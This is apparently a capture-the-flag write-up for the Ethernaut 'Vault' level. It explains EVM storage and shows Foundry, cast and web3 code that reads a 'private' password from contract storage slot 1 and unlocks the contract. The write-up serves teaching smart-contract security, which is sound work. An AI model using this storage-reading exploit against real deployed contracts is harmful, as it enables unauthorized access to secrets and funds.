## 👾 08. Vault

<br>


### tl; dr

<br>


* this challenge explores the fact that if a state variable is declared `private`, it's only hidden from other contracts (*i.e.*, it's private within the contract's scope). 
  - in other words, a `private` variable's value is still recorded in the blockchain and is open to anyone who understands how the memory is organized.

<br>

* remember that `public` and `private` are visibility modifiers, while `pure` and `view` are state modifiers. 
    - a great explanation about **solidity function visibility** can be found on **[solidity by example](https://solidity-by-example.org/visibility/)**.


<br>

* before we start, it's worth talking about the four ways the EVM stores data, depending on their context:
  1. firstly, there is the **key-value stack**, where you can `POP`, `PUSH` , `DUP1`, or `POP` data. 
      - basically, the EVM is a stack machine, as it does not operate on registers but on a virtual stack with a size limit `1024`. 
     - stack items (both keys and values) have a size of `32-bytes` (or `256-bit`), so the EVM is a `256-bit` word machine (facilitating, for instance, `keccak256` hash scheme and elliptic-curve computations).
  2. secondly, there is the **byte-array memory (RAM)**, used to store data during execution (such as passing arguments to internal functions). 
      - opcodes are `MSTORE`, `MLOAD`, or `MSTORE8`.
  3. third, there is the **calldata** (which can be accessed through `msg.data`), a read-only byte-addressable space for the data parameter of a transaction or call. 
      - unlike the stack, this data is accessed by specifying the exact byte offset and the number of bytes to read. 
      - opcdes are `CALLDATACOPY`, which copies a number of bytes of the transaction to memory, `CALLDATASIZE`, and `CALLDATALOAD`.
   4. lastly, there is **disk storage**, a persistent read-write word-addressable space, where each contract stores persistent information (and where state variables live), and is represented by a mapping of `2^{256}` slots of `32 bytes` each. 
      - the opcode `SSTORE` is used to store data and `SLOAD` to load.


<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/1130416/9863a3ce-ee78-4d75-861e-85691e44cbea">
</p>


<br>

```solidity
contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```


<br>

---

### discussion

<br>

* the first thing we see in the contract is the two state variables set as `private`. 
  - in particular, `password` is declared as `byte32`, which makes this problem even simpler (hint: remember that **[the EVM operates on 32 bytes at a time](https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html)**):

<br>

```solidity
bool private locked; 
bytes32 private password;
```

<br>

* looking at the constructor, we see that `password` is given as input by whoever deploys this contract (and also setting the variable `locked` to `True`):

<br>

```solidity
  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }
```

<br>

* finally, we look at the only function in the contract: it "unlocks" `locked` when given the correct password:

<br>

```solidity
function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
}
```

<br> 

* there are many ways to solve this exercise, but the theory is the same: each smart contract has its own storage reflecting the state of the contract, which is divided into 32-byte slots.

<br>

* a first approach is simply to call the **[well-known API](https://web3js.readthedocs.io/en/v1.2.9/web3-eth.html#getstorageat)** `web3.eth.getStorageAt(contractAddress, slotNumber)`, as we know the contract address and that `password` is on slot number `1`:

<br>

```shell
> await web3.eth.getStorageAt("<contract address>, 1")
```
<br>

* however, we use a more formal approach that leverages **[foundry's `vm.load()` method](https://book.getfoundry.sh/cheatcodes/load?highlight=vm.load#examples)**:


<br>

```
function load(address account, bytes32 slot) external returns (bytes32);
```

<br>

* in particular, foundry's **[std storage library](https://book.getfoundry.sh/reference/forge-std/std-storage)** is a great util to manipulate storage. 
  - from the foundry book, here is an illustration of how `vm.load()` works:

<br>

```
contract LeetContract {
     uint256 private leet = 1337; // slot 0
}

bytes32 leet = vm.load(address(leetContract), bytes32(uint256(0)));
emit log_uint(uint256(leet)); // 1337
```



<br>



----

### solution

<br>

* check `test/08/Vault.t.sol`:

<br>

```solidity
contract VaultTest is Test {

    Vault public level;

    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {

        vm.prank(instance);    
    
    }

    function testVaultHack() public {

        vm.startPrank(hacker);
        
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        level = new Vault(password);
        level.unlock(password);
        assert(level.locked() == false);
        
        vm.stopPrank();
        
    }
}
```

<br>

* run the test with:

<br>

```shell
> forge test --match-contract VaultTest -vvvv    
```



<br>

* then submit the solution with `script/08/Vault.s.sol`:

<br>

```solidity
contract Exploit is Script {
    address instance = vm.envAddress("INSTANCE_LEVEL8");  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
    Vault level = Vault(instance);  
               
    function run() external {

        vm.startBroadcast(hacker);
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        level.unlock(password);
        vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/08/Vault.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---

### alternative solution using `cast`

<br>

* get the password with:

<br>

```shell
> cast storage <contract address> 1 --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* run in the console:

<br>

```shell
> await contract.unlock(<password>)
```

<br>

----

### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



<br>

---

### external resources

<br>

* **[solidity docs on slots](https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html)**
* **[solidity by example: visibility](https://solidity-by-example.org/visibility/)**
* **[foundry book cheatcode for vm](https://book.getfoundry.sh/cheatcodes/load?highlight=vm.load#examples)**
